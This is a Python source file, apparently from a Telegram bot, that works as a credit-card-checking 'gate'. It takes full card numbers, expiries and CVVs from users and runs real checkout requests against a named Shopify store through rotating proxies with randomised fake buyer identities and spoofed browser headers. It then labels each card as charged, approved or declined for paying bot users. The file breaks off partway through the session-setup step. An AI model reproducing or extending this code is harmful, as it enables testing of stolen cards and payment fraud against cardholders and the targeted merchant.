# BOT/gates/charge/shopify/shopify077.py

import json
import asyncio
import re
import time
import random
import string
import base64
import httpx
import urllib.parse
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
import unicodedata

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
except ImportError:
    def auth_and_free_restricted(func):
        async def wrapper(client, message):
            return await func(client, message)
        return wrapper

try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False
    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Import filter.py for smart card parsing
try:
    from BOT.helper.filter import extract_cards
    FILTER_AVAILABLE = True
    print("✅ Filter module imported successfully for shopify077")
except ImportError as e:
    print(f"❌ Filter module import error in shopify077: {e}")
    FILTER_AVAILABLE = False

# Import proxy system functions
try:
    from BOT.tools.proxy import (
        get_proxy_for_user,
        mark_proxy_success,
        mark_proxy_failed,
        get_random_proxy,
        parse_proxy,
        test_proxy,
        PROXY_ENABLED
    )
    PROXY_SYSTEM_AVAILABLE = True
    print("✅ Proxy system imported successfully for shopify077")
except ImportError as e:
    print(f"❌ Proxy system import error in shopify077: {e}")
    PROXY_SYSTEM_AVAILABLE = False
    def get_proxy_for_user(user_id: int, strategy: str = "random"):
        return None
    def mark_proxy_success(proxy: str, response_time: float):
        pass
    def mark_proxy_failed(proxy: str):
        pass
    def get_random_proxy():
        return None
    def parse_proxy(proxy_str: str):
        return None
    def test_proxy(proxy_str: str):
        return False

# ========== DETAILED LOGGER ==========
class ShopifyLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHP077-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        self.logs = []

    def start_check(self, card_details):
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc

        log_msg = f"""
🛒 [SHOPIFY CHARGE 0.77$]
   ├── Check ID: {self.check_id}
   ├── User ID: {self.user_id or 'N/A'}
   ├── Card: {masked_cc}
   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
   └── Target: shopmiddleeastern.com - El Mordjene Vanille
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def add_log(self, message):
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        self.logs.append(f"[{timestamp}] {message}")

    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0

        status_icons = {
            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
            "TYPE": "⌨️", "WAIT": "⏳"
        }
        status_icon = status_icons.get(status, "➡️")

        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
        log_msg += f"\n   ├── Action: {action}"
        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
        if details:
            log_msg += f"\n   └── Details: {details}"

        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def data_extracted(self, data_type, value, source=""):
        if isinstance(value, dict):
            value_str = json.dumps(value, indent=2)
            if len(value_str) > 150:
                value_str = value_str[:147] + "..."
        else:
            value_str = str(value)
            if len(value_str) > 100:
                value_str = value_str[:97] + "..."

        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
        if source:
            log_msg += f"\n   │   └── From: {source}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def card_details_log(self, cc, mes, ano, cvv):
        masked_cc = cc[:6] + "******" + cc[-4:]
        log_msg = f"""
   ├── 💳 Card Details:
   │   ├── Number: {masked_cc}
   │   ├── Expiry: {mes}/{ano}
   │   └── CVV: {'*' * len(cvv)}
        """
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def error_log(self, error_type, message, step=""):
        error_icons = {
            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓",
            "PROXY": "🔧", "NO_PROXY": "🚫", "PCI": "💳",
            "CHECKOUT_TOKEN": "🎫", "PROCESSING": "⏳"
        }
        error_icon = error_icons.get(error_type, "⚠️")
        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
        if step:
            log_msg += f"\n   └── At Step: {step}"
        self.add_log(log_msg)
        print(log_msg)
        print()
        return log_msg

    def success_log(self, message, details=""):
        log_msg = f"✅ SUCCESS: {message}"
        if details:
            log_msg += f"\n   └── Details: {details}"
        self.add_log(log_msg)
        print(log_msg)
        return log_msg

    def complete_result(self, success, final_status, response_message, total_time):
        result_icon = "✅" if success else "❌"
        result_text = "APPROVED" if success else "DECLINED"

        if len(response_message) > 100:
            response_display = response_message[:97] + "..."
        else:
            response_display = response_message

        log_msg = f"""
{result_icon} [SHOPIFY CHARGE COMPLETED]
   ├── Check ID: {self.check_id}
   ├── Result: {result_text}
   ├── Final Status: {final_status}
   ├── Steps Completed: {self.step_counter}
   ├── Total Time: {total_time:.2f}s
   ├── Response: {response_display}
   └── End Time: {datetime.now().strftime('%H:%M:%S')}
        """
        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
        self.add_log(log_msg)
        self.add_log(summary)
        print(log_msg)
        print(summary)
        print("="*80)
        return log_msg, summary

    def get_all_logs(self):
        return "\n".join(self.logs)


# ========== UTILITY FUNCTIONS ==========
def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            return json.load(f).get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    if str(user_id) in users:
        return users[str(user_id)].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def check_cooldown(user_id, command_type="si"):
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15) or 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0


# ========== FORMAT RESPONSE FUNCTION ==========
def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data, proxy_status="Dead 🚫"):
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except:
        user_id = None

    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Charge 0.77$ 🌯")
    except:
        gateway = "Shopify Charge 0.77$ 🌯"

    raw_response = str(raw_response) if raw_response else "-"
    
    # FIRST check specifically for TIMEOUT and PCI errors only
    if "TIMEOUT" in raw_response.upper() or "PCI_ERROR" in raw_response.upper():
        status_flag = "Error❗️"
        response_display = "Try again ♻️"
    else:
        # Extract clean error message - only the error identifier before colon
        if "DECLINED - " in raw_response:
            response_display = raw_response.split("DECLINED - ")[-1]
            if ":" in response_display:
                response_display = response_display.split(":")[0].strip()
            response_display = response_display.split('\n')[0]
            if len(response_display) > 30:
                response_display = response_display[:27] + "..."
        elif "ORDER_PLACED" in raw_response.upper() or "PROCESSEDRECEIPT" in raw_response:
            response_display = "ORDER_PLACED"
        elif "APPROVED - " in raw_response:
            response_display = "APPROVED"
        elif "GENERIC_ERROR" in raw_response:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
            else:
                response_display = "GENERIC_ERROR"
        elif "PROXY_DEAD" in raw_response:
            response_display = "PROXY_DEAD"
        elif "NO_PROXY_AVAILABLE" in raw_response:
            response_display = "NO_PROXY_AVAILABLE"
        elif "CAPTCHA" in raw_response.upper():
            response_display = "CAPTCHA"
        elif "3D" in raw_response.upper() or "3DS" in raw_response.upper():
            response_display = "3D_SECURE"
        elif "INSUFFICIENT" in raw_response.upper():
            response_display = "INSUFFICIENT_FUNDS"
        elif "INVALID" in raw_response.upper():
            response_display = "INVALID_CARD"
        elif "EXPIRED" in raw_response.upper():
            response_display = "EXPIRED_CARD"
        elif "FRAUD" in raw_response.upper():
            response_display = "FRAUD"
        elif "TAX_NEW_TAX_MUST_BE_ACCEPTED" in raw_response:
            response_display = "TAX_CHANGE"
        elif "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in raw_response:
            response_display = "PAYMENT_AMOUNT_ERROR"
        elif "PROCESSING_TIMEOUT" in raw_response:
            response_display = "PROCESSING_TIMEOUT"
        else:
            if ":" in raw_response:
                response_display = raw_response.split(":")[0].strip()
                if len(response_display) > 30:
                    response_display = response_display[:27] + "..."
            else:
                response_display = raw_response[:30] + "..." if len(raw_response) > 30 else raw_response

        raw_response_upper = raw_response.upper()

        # Check for NO RECEIPT ID first (before success checks)
        if "NO RECEIPT ID" in raw_response_upper:
            status_flag = "Declined ❌"
        # Check for SUCCESS indicators
        elif any(keyword in raw_response_upper for keyword in [
            "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
            "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
            "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
            "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
            "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
            "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
        ]):
            status_flag = "Charged ✅"
        # Check for CAPTCHA
        elif any(keyword in raw_response_upper for keyword in [
            "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
            "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
            "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
            "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
            "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
        ]):
            status_flag = "Captcha ⚠️"
        # Check for PAYMENT ERROR
        elif any(keyword in raw_response_upper for keyword in [
            "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
            "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
            "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
            "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
        ]):
            status_flag = "Declined ❌"
        # Check for INSUFFICIENT FUNDS
        elif any(keyword in raw_response_upper for keyword in [
            "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
        ]):
            status_flag = "Declined ❌"
        # Check for INVALID CARD
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
        ]):
            status_flag = "Declined ❌"
        # Check for EXPIRED CARD
        elif any(keyword in raw_response_upper for keyword in [
            "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
        ]):
            status_flag = "Declined ❌"
        # Check for 3D Secure
        elif any(keyword in raw_response_upper for keyword in [
            "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
            "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
            "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
            "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
            "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
        ]):
            status_flag = "Approved ❎"
        # Check for CVV errors
        elif any(keyword in raw_response_upper for keyword in [
            "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
        ]):
            status_flag = "Declined ❌"
        # Check for fraud
        elif any(keyword in raw_response_upper for keyword in [
            "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
            "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
        ]):
            status_flag = "Fraud ⚠️"
        # Check for proxy errors
        elif "NO_PROXY_AVAILABLE" in raw_response_upper or "PROXY_DEAD" in raw_response_upper:
            status_flag = "Proxy Error 🚫"
        # Default to declined
        else:
            status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    result = f"""
<b>[#Shopify Charge 0.77$] | #WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.77$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{response_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>{proxy_status}</code>]
"""
    return result


# ========== UNIVERSAL UNICODE STRIPPER & CARD EXTRACTOR ==========
def strip_all_unicode(text):
    """
    Strips ALL Unicode characters, emojis, fancy fonts, and special characters
    Returns only ASCII characters, numbers, and basic punctuation
    """
    normalized = unicodedata.normalize('NFKD', text)
    ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
    return ascii_text


def extract_cc_from_ascii(text):
    """
    Extracts credit card details from ASCII text
    Returns (cc, mm, yy, cvv) or (None, None, None, None)
    """
    digit_sequences = re.findall(r'\d+', text)
    
    if len(digit_sequences) < 4:
        return None, None, None, None
    
    for i in range(len(digit_sequences) - 3):
        potential_cc = digit_sequences[i]
        potential_month = digit_sequences[i+1]
        potential_year = digit_sequences[i+2]
        potential_cvv = digit_sequences[i+3]
        
        if not (13 <= len(potential_cc) <= 19):
            continue
            
        try:
            month_val = int(potential_month)
            if not (1 <= month_val <= 12):
                continue
        except:
            continue
            
        if not (len(potential_year) in [2, 4]):
            continue
            
        if not (len(potential_cvv) in [3, 4]):
            continue
        
        cc = potential_cc
        mm = potential_month.zfill(2)
        yy = potential_year[-2:] if len(potential_year) == 4 else potential_year
        cvv = potential_cvv
        
        return cc, mm, yy, cvv
    
    return None, None, None, None


def intelligent_card_parse(text):
    """
    Universal card parser that handles ANY type of Unicode/fancy text
    Strips all Unicode first, then extracts CC details
    """
    try:
        if FILTER_AVAILABLE:
            try:
                all_cards, unique_cards = extract_cards(text)
                if unique_cards:
                    first_card = unique_cards[0]
                    parts = first_card.split('|')
                    if len(parts) >= 4:
                        cc = parts[0].strip()
                        mm = parts[1].strip().zfill(2)
                        yy = parts[2].strip()
                        cvv = parts[3].strip()
                        
                        if len(yy) == 4:
                            yy = yy[-2:]
                        
                        if (13 <= len(cc) <= 19 and cc.isdigit() and 
                            mm.isdigit() and 1 <= int(mm) <= 12 and
                            yy.isdigit() and len(yy) in [2, 4] and
                            cvv.isdigit() and len(cvv) in [3, 4]):
                            return cc, mm, yy, cvv
            except:
                pass
        
        ascii_text = strip_all_unicode(text)
        
        pipe_pattern = r'(\d{13,19})\s*[\|\:\;]\s*(\d{1,2})\s*[\|\:\;]\s*(\d{2,4})\s*[\|\:\;]\s*(\d{3,4})'
        pipe_match = re.search(pipe_pattern, ascii_text)
        if pipe_match:
            cc = pipe_match.group(1)
            mm = pipe_match.group(2).zfill(2)
            yy = pipe_match.group(3)
            cvv = pipe_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        space_pattern = r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
        space_match = re.search(space_pattern, ascii_text)
        if space_match:
            cc = space_match.group(1)
            mm = space_match.group(2).zfill(2)
            yy = space_match.group(3)
            cvv = space_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        comma_pattern = r'(\d{13,19})\s*[,]\s*(\d{1,2})\s*[,]\s*(\d{2,4})\s*[,]\s*(\d{3,4})'
        comma_match = re.search(comma_pattern, ascii_text)
        if comma_match:
            cc = comma_match.group(1)
            mm = comma_match.group(2).zfill(2)
            yy = comma_match.group(3)
            cvv = comma_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        slash_pattern = r'(\d{13,19})\s*[/]\s*(\d{1,2})\s*[/]\s*(\d{2,4})\s*[/]\s*(\d{3,4})'
        slash_match = re.search(slash_pattern, ascii_text)
        if slash_match:
            cc = slash_match.group(1)
            mm = slash_match.group(2).zfill(2)
            yy = slash_match.group(3)
            cvv = slash_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        common_pattern = r'(\d{13,19})\s+(\d{1,2})[/\-](\d{2,4})\s+(\d{3,4})'
        common_match = re.search(common_pattern, ascii_text)
        if common_match:
            cc = common_match.group(1)
            mm = common_match.group(2).zfill(2)
            yy = common_match.group(3)
            cvv = common_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        card_label_pattern = r'(?:card|cc|c[ck])\s*[:：=]\s*(\d{13,19})[\s\|:,]+(\d{1,2})[\s\|:,]+(\d{2,4})[\s\|:,]+(\d{3,4})'
        card_label_match = re.search(card_label_pattern, ascii_text, re.IGNORECASE)
        if card_label_match:
            cc = card_label_match.group(1)
            mm = card_label_match.group(2).zfill(2)
            yy = card_label_match.group(3)
            cvv = card_label_match.group(4)
            if len(yy) == 4:
                yy = yy[-2:]
            return cc, mm, yy, cvv
        
        cc, mm, yy, cvv = extract_cc_from_ascii(ascii_text)
        if cc:
            return cc, mm, yy, cvv
        
    except Exception as e:
        print(f"Card parsing error: {e}")
    
    return None, None, None, None


def parse_card_input(card_input):
    """Parse card input using universal Unicode stripper"""
    return intelligent_card_parse(card_input)


# ========== SHOPIFY MIDDLE EASTERN CHECKOUT CLASS (FIXED) ==========
class ShopifyMiddleEasternCheckout:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.base_url = "https://shopmiddleeastern.com"
        self.product_handle = "el-mordjene-vanille-10-g"
        self.variant_id = "39312450584663"
        self.product_id = "6564222206039"
        
        # Cookie storage - CRITICAL for maintaining session
        self.cookies = {}
        self.cookie_jar = None
        
        # Proxy management
        self.proxy_url = None
        self.proxy_status = "Dead 🚫"
        self.proxy_used = False
        self.proxy_response_time = 0.0

        # Session for maintaining cookies - will be initialized with proxy
        self.client = None

        # Base headers (Chrome 147 from captured traffic)
        self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        self.sec_ch_ua = '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"'

        # Dynamic data storage
        self.checkout_token = None  # Extracted from URL after redirect
        self.session_token = None   # x-checkout-one-session-token from checkout page HTML
        self.graphql_session_token = None  # Constructed from checkout_token + timestamp
        self.receipt_id = None
        self.stable_id = None
        self.queue_token = None
        self.shop_id = "7899283507"
        
        # Track tokens from responses
        self._shopify_y = None
        self._shopify_s = None
        self._shopify_essential = None
        self.cart_token = None
        self.signature = None  # shopify-identification-signature for PCI
        
        # GraphQL operation IDs (from captured traffic)
        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
        
        # Delivery strategy handle (Middle Eastern Market pickup)
        self.delivery_strategy_handle = "ac9e7f3aa427ceb472f68152b58f9b9d-d1034e3625f52df7167f7147c44cdf16"
        
        # Payment method identifier (Shopify Payments)
        self.payment_method_identifier = "52f25659ce34a87c642a51c00887c2e2"

        self.logger = ShopifyLogger(user_id)

        # Random data generators
        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua",
                           "Ahley", "Ashley", "Jessica", "Sarah", "Emily", "Lisa", "Michelle", "Mallika"]
        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", 
                          "Trump", "Walker", "Hall", "Allen", "Young", "King", "Baby"]

        self.first_name = random.choice(self.first_names)
        self.last_name = random.choice(self.last_names)
        self.full_name = f"{self.first_name} {self.last_name}"
        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
        self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"

        # Fixed address (Middle Eastern Market pickup location)
        self.address = {
            "address1": "3950 N Harlem Ave",
            "address2": "",
            "city": "Chicago",
            "provinceCode": "IL",
            "zip": "60634",
            "countryCode": "US"
        }
        
        # Coordinates (will be fetched from Atlas during checkout)
        self.coordinates = {
            "latitude": 41.9522135,
            "longitude": -87.8076595
        }

    def _update_cookies_from_response(self, response):
        """Extract and store cookies from response"""
        try:
            for cookie in response.cookies.jar:
                self.cookies[cookie.name] = cookie.value
                if cookie.name == '_shopify_y':
                    self._shopify_y = cookie.value
                elif cookie.name == '_shopify_s':
                    self._shopify_s = cookie.value
                elif cookie.name == '_shopify_essential':
                    self._shopify_essential = cookie.value
                elif cookie.name == 'cart':
                    self.cart_token = cookie.value
        except:
            pass

    def _get_cookie_header(self):
        """Build cookie header string from stored cookies"""
        important_cookies = ['localization', 'cart_currency', '_shopify_y', '_shopify_s', 
                            'cart', '_shopify_essential', '_shopify_analytics', '_shopify_marketing']
        cookie_parts = []
        for name in important_cookies:
            if name in self.cookies:
                cookie_parts.append(f"{name}={self.cookies[name]}")
        return "; ".join(cookie_parts)

    async def random_delay(self, min_sec=0.2, max_sec=0.5):
        """Minimal delay between requests"""
        await asyncio.sleep(random.uniform(min_sec, max_sec))

    def step(self, num, name, action, details=None, status="PROCESSING"):
        return self.logger.step(num, name, action, details, status)

    def extract_checkout_token(self, url):
        """Extract checkout token from URL"""
        patterns = [
            r'/checkouts/cn/([^/?]+)',
            r'token=([^&]+)',
            r'checkout_token=([^&]+)',
            r'checkouts/([^/?]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        try:
            decoded = urllib.parse.unquote(url)
            for pattern in patterns:
                match = re.search(pattern, decoded)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def extract_session_token_from_html(self, html):
        """Extract session token (x-checkout-one-session-token) from checkout page HTML"""
        patterns = [
            r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
            r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
            r'sessionToken[\s:=]+["\'"]?(AAEB[A-Za-z0-9_\-]+)',
            r'\"sessionToken\":\"(AAEB[^\"]+)',
            r'(AAEB[A-Za-z0-9_\-]{50,})',
            r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None
    
    def extract_signature_from_html(self, html):
        """Extract shopify-identification-signature from checkout page HTML"""
        patterns = [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None
    
    def extract_queue_token_from_html(self, html):
        """Extract queue token from checkout page HTML"""
        patterns = [
            r'"queueToken"\s*:\s*"([^"]+)"',
            r'queueToken&quot;:&quot;([^&]+)&quot;',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None
    
    def extract_stable_id_from_html(self, html):
        """Extract stable ID from checkout page HTML"""
        patterns = [
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            r'stableId[\s:=]+["\'"]([0-9a-f-]{36})',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None

    def generate_random_string(self, length=16):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_uuid(self):
        """Generate UUID format string"""
        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"

    def generate_timestamp(self):
        """Generate timestamp for session token"""
        return str(int(time.time() * 1000))

    def construct_graphql_session_token(self):
        """Construct session token for GraphQL variables"""
        if not self.checkout_token:
            return None
        timestamp = self.generate_timestamp()
        return f"{self.checkout_token}-{timestamp}"
    
    def build_headers(self, extra=None):
        """Build headers with current cookies"""
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': self.ua,
        }
        if extra:
            headers.update(extra)
        
        cookie_header = self._get_cookie_header()
        if cookie_header:
            headers['cookie'] = cookie_header
        
        return headers

    # ========== STEP 0: Initialize Session & Get Cookies ==========
    async def initialize_session(self):
        """Step 0: Visit the store to get initial cookies"""
        self.step(0, "INITIALIZE SESSION", "Visiting store to get cookies")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua,
        }
        
        try:
            resp = await self.client.get(
                self.base_url,
                headers=headers,
                timeout=25,
                follow_redirects=True
            )
            self._update_cookies_from_response(resp)
            
            if resp.status_code == 200:
                self.logger.data_extracted("Shopify Y", self._shopify_y or "None", "Initial Session")
                self.logger.data_extracted("Shopify S", self._shopify_s or "None", "Initial Session")
                return True, "SESSION_INITIALIZED"
            return False, f"Session init failed: {resp.status_code}"
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on session init: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on session init: {str(e)}")
